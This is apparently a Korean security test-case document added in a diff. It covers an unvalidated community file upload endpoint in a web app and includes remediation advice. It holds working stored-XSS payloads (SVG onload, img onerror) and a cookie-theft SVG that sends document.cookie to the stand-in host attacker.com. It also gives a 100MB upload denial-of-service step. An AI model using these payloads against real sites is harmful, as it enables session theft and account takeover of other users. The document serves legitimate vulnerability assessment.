@@ -1,0 +1,131 @@
+================================================================================
+[VCE-CM-07] 악성코드 파일 업로드 (커뮤니티 게시판)
+도메인: community
+================================================================================
+
+1. 진단 항목 개요
+   - 항목명: 커뮤니티 파일 업로드 확장자 무검증 → SVG XSS / WebShell
+   - 번호: CM-07
+   - 위험도: Critical
+   - OWASP: A03:2021 – Injection
+
+2. 대상 기능 & 엔드포인트
+   - 로컬:  POST http://localhost:8080/api/community/uploads
+   - 운영:  POST https://vceapp.com/api/community/uploads
+   - HTTP 메서드: POST (multipart/form-data)
+   - 인증 요건: 불명확 (SecurityConfig에서 /api/community/uploads 인증 여부 확인 필요)
+
+   주의: CommunityController.java의 /uploads 엔드포인트가 @AuthenticationPrincipal 없이
+   구현되어 있을 경우 비인증 업로드도 가능하다.
+
+3. 취약점 원리 (Why this works)
+   FileService.java:42 에 파일 확장자, MIME 타입 검증이 없다.
+   커뮤니티 게시글 작성 시 이미지 업로드 기능에서 악성 파일을 업로드하면:
+
+   1. SVG 파일 업로드 → 게시글에 <img src="/uploads/evil.svg"> 삽입
+      → 다른 사용자 게시글 열람 시 JavaScript 실행 (Stored XSS 연계)
+   2. HTML 파일 업로드 → /uploads/phishing.html 에 피싱 페이지 호스팅
+   3. JSP 업로드 → 서버에서 실행 시 RCE
+   4. 대용량 파일 업로드 → 디스크 고갈 (DoS)
+
+   CommunityDetail.tsx:323의 dangerouslySetInnerHTML과 연계하면:
+   게시글 content에 <img src="/uploads/evil.svg"> 를 삽입하면
+   SVG 파일의 onload 이벤트가 실행된다.
+
+4. 테스트 절차 (Step-by-step)
+
+   [사전 준비]
+   - test@vce.com 로그인 → JWT 획득
+
+   Step 1. 정상 이미지 업로드 확인
+   --- HTTP 요청 예시 ---
+   POST /api/community/uploads HTTP/1.1
+   Host: localhost:8080
+   Authorization: Bearer <JWT>
+   Content-Type: multipart/form-data; boundary=----Boundary
+
+   ------Boundary
+   Content-Disposition: form-data; name="file"; filename="image.png"
+   Content-Type: image/png
+
+   [PNG 바이너리]
+   ------Boundary--
+   ---
+
+   Step 2. SVG XSS 파일 업로드
+   --- HTTP 요청 예시 ---
+   ------Boundary
+   Content-Disposition: form-data; name="file"; filename="xss.svg"
+   Content-Type: image/svg+xml
+
+   <?xml version="1.0" encoding="UTF-8"?>
+   <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
+   <circle cx="100" cy="100" r="100"/>
+   </svg>
+   ------Boundary--
+   ---
+
+   Step 3. 업로드 URL을 게시글에 삽입 (dangerouslySetInnerHTML 연계)
+   --- HTTP 요청 예시 ---
+   POST /api/community/posts HTTP/1.1
+   Host: localhost:8080
+   Authorization: Bearer <JWT>
+   Content-Type: application/json
+
+   {
+     "title": "공지사항",
+     "content": "<img src='/uploads/uuid_xss.svg' onerror='alert(1)'>"
+   }
+   ---
+
+   Step 4. 쿠키 탈취 페이로드
+   SVG 파일 내용:
+   <svg xmlns="http://www.w3.org/2000/svg"
+     onload="fetch('https://attacker.com/c?v='+encodeURIComponent(document.cookie))">
+   </svg>
+
+   게시글 content:
+   "<img src='/uploads/uuid_steal.svg'>"
+
+   Step 5. 비인증 상태로 업로드 시도
+   --- HTTP 요청 예시 ---
+   POST /api/community/uploads HTTP/1.1
+   Host: localhost:8080
+   Content-Type: multipart/form-data; boundary=----Boundary
+   (Authorization 헤더 없음)
+
+   ------Boundary
+   Content-Disposition: form-data; name="file"; filename="test.svg"
+   Content-Type: image/svg+xml
+
+   <svg onload="alert(1)"></svg>
+   ------Boundary--
+   ---
+   비인증으로도 업로드 성공 시 추가 취약점 확인
+
+   Step 6. 대용량 파일 업로드
+   python3 -c "open('/tmp/bigfile.bin','wb').write(b'A'*100*1024*1024)"
+   → 100MB 파일 업로드 시도
+
+5. 취약 여부 판단 기준
+   ✅ 취약 (Vulnerable):
+      - SVG 파일 업로드 HTTP 200 성공
+      - 업로드 URL 접근 시 브라우저에서 alert() 실행
+      - 게시글에 SVG 삽입 후 다른 계정으로 조회 시 쿠키 탈취됨
+      - 비인증 업로드 성공
+   ✗ 안전 (Not Vulnerable):
+      - SVG/HTML/JSP 업로드 → HTTP 400 "허용되지 않는 파일 형식"
+      - 업로드 가능하나 Content-Type: text/plain으로 서빙 (실행 안 됨)
+
+6. 예상 취약 포인트 (코드 위치)
+   - FileService.java:42 — 확장자/MIME 검증 없이 저장
+   - CommunityController.java — /api/community/uploads 인증 미적용 가능성
+   - SecurityConfig.java:72 — /uploads/** permitAll
+   - CommunityDetail.tsx:323 — dangerouslySetInnerHTML (SVG 삽입 → XSS 연계)
+
+7. 권고 조치
+   - 허용 확장자: .jpg, .jpeg, .png, .gif, .webp 만 허용
+   - SVG 업로드 차단 (JavaScript 포함 가능)
+   - /api/community/uploads에 @AuthenticationPrincipal 필수 적용
+   - 업로드 파일 Content-Type 강제: image/jpeg, image/png 등으로 재지정 서빙
+   - CommunityDetail.tsx: dangerouslySetInnerHTML → DOMPurify 적용
